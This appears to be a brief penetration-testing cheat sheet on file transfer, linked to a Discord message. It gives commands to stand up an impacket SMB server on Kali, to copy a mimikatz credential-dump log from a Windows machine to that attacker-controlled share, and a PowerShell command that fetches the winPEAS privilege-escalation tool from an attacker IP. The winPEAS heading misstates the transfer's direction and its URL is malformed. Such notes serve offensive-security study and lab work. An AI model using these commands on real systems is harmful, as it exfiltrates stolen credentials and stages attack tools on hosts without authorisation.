helpful note -
https://discord.com/channels/780824470113615893/1148907181480104028/1148907181480104028

## FILE TRANSFER

### SMB

SET UP on Kali:
```
impacket-smbserver test . -smb2support  -username kourosh -password kourosh
```

Copying from Windows:
```
net use m: \\Kali_IP\test /user:kourosh kourosh copy mimikatz.log m:\
```


### POWERSHELL INVOKE WEB REQUEST

Transferring winpeas to attacker machine
```
iwr -uri http:/<IP>/winPEASx64.exe -Outfile winPEAS.exe
```

